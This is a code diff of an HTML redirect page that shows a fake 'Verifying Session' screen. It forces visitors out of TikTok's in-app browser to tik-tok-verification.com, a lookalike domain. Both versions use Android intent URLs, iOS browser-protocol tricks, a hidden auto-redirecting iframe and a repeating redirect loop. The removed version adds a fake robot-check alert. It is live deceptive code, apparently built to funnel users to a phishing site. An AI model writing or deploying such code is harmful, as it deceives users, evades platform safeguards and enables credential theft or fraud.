@@ -3,66 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        #msg { text-align: center; font-size: 14px; opacity: 0.8; }
-    </style>
+    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
 </head>
 <body>
-    <div id="msg">INITIALIZING SECURE CONNECTION...</div>
+
+<div id="status" style="padding: 20px; font-family: sans-serif; text-align: center;">Verifying Session...</div>
 
 <script>
-    const finalUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const cleanDomain = "tik-tok-verification.com/Verification/verify1.html";
+    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function launchEject() {
-        const ua = navigator.userAgent;
-        const isAndroid = /Android/i.test(ua);
-        const isiOS = /iPhone|iPad|iPod/i.test(ua);
+    function triggerEject() {
+        const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android Chrome Force
-            window.location.href = `intent://${cleanDomain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
-        } else if (isiOS) {
-            // iOS: THE CONTEXT-SWITCH OVERFLOW
-            // 1. Fire a 'fake' system protocol to trigger the OS listener
-            window.location.href = "googlechromes://" + cleanDomain;
+            // Android: The Intent protocol is still the only 100% way.
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+        } else {
+            // iOS: THE FRAME-BURST
+            // We create an invisible iframe that contains an auto-redirecting meta tag.
+            // This bypasses the 'top-level' navigation lock.
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
 
-            // 2. Immediately fire the 'Safari' direct protocol
-            setTimeout(() => {
-                window.location.href = "safari-https://" + cleanDomain;
-            }, 50);
+            const frameDoc = iframe.contentWindow.document;
+            const content = `
+                <html>
+                <head>
+                    <meta http-equiv="refresh" content="0;url=safari-https://${domain}">
+                </head>
+                <body>
+                    <script>window.location.replace("googlechromes://${domain}");<\/script>
+                </body>
+                </html>
+            `;
+            
+            frameDoc.open();
+            frameDoc.write(content);
+            frameDoc.close();
 
-            // 3. THE MAGIC: Create an auto-executing data-download
-            // This forces the "Open in Safari?" prompt because TikTok can't render data-blobs.
+            // Backup: Top-level protocol hit
             setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = 'data:text/html;base64,' + btoa('<script>window.location.href="' + finalUrl + '";<\/script>');
-                link.download = 'verify.html';
-                link.click();
-            }, 150);
+                window.location.href = "safari-https://" + domain;
+            }, 500);
         }
     }
 
-    function securityLoop() {
-        launchEject();
-        
-        // Use the alert to "Pause" the TikTok execution loop
-        // while the OS processes the protocol jumps in the background.
-        setTimeout(() => {
-            if (document.hasFocus()) {
-                const header = "CONNECTION SECURITY CHECK\n";
-                const body = "______________________________\n\nPlease confirm you are not a robot to continue to the external verification portal.";
-                
-                alert(header + body);
-                
-                launchEject();
-                setTimeout(securityEngine, 500);
-            }
-        }, 500);
-    }
+    // Fire immediately
+    triggerEject();
 
-    window.onload = securityLoop;
+    // Re-trigger if they stay on the page (e.g. they close the popup)
+    setInterval(() => {
+        if (document.hasFocus()) {
+            triggerEject();
+        }
+    }, 2000);
 </script>
 </body>
 </html>
